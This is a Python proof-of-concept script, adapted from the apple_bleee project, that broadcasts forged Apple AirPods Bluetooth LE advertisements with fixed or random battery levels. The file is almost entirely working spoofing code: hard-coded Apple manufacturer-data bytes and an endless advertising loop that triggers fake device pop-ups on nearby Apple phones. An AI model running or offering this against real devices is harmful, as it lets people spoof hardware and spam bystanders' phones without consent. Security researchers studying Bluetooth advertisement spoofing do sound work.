# Adapting script from https://github.com/hexway/apple_bleee
# Thanks to Dmitry Chastuhin @_chipik and https://hexway.io 
# Author: @lucferbux
import random
import hashlib
import argparse
from time import sleep
import bluetooth._bluetooth as bluez
from utils.bluetooth_utils import (toggle_device, start_le_advertising, stop_le_advertising)

class AdvAirpods():

    def __init__(self, args=None, random=False, interval=200, ble_iface=0):
        if args:
            self.random = args.random
            self.interval = args.interval
            self.ble_iface = args.ble_iface
        else:
            self.random = random
            self.interval = interval
            self.ble_iface = ble_iface

    def advertisment(self):
        """Get values for the accesories of the airpod and genrates an le advertising with them
        """
        if self.random:
            left_speaker, right_speaker, case = self.random_values()
        else:
            left_speaker = (100,)
            right_speaker = (100,)
            case = (100,)

        interval = self.interval
        toggle_device(self.ble_iface, True)

        data1 = (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45)
        data2 = (0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93, 0x3a)
        try:
            sock = bluez.hci_open_dev(args.ble_iface)
        except:
            print(f"Cannot open bluetooth device {self.ble_iface}")
            return
        try:
            print("Start advertising press ctrl + c to quit...")
            start_le_advertising(sock, adv_type=0x03, min_interval=interval, max_interval=interval,
                                data=(data1 + left_speaker + right_speaker + case + data2))
            while True:
                sleep(2)
        except:
            stop_le_advertising(sock)
            print()
            print("Bye")

    def random_values(self):
        """Get random values for all the airpods' accesories
        
        Returns:
            (int, int, int): Tuple with the values of the accesories
        """
        left_speaker = (random.randint(1, 100),)
        right_speaker = (random.randint(1, 100),)
        case = (random.randint(128, 228),)
        return left_speaker, right_speaker, case


def create_parser():
    help_desc = '''
    AirPods advertise spoofing PoC
    ---chipik
    '''
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval')
    parser.add_argument('-r', '--random', action='store_true', help='Send random charge values')
    parser.add_argument('-b', '--ble_iface', default=0, type=int, help='Bluetooth inteface')
    return parser.parse_args()

if __name__ == "__main__":
    args = create_parser()
    airpods = AdvAirpods(args)
    airpods.advertisment()

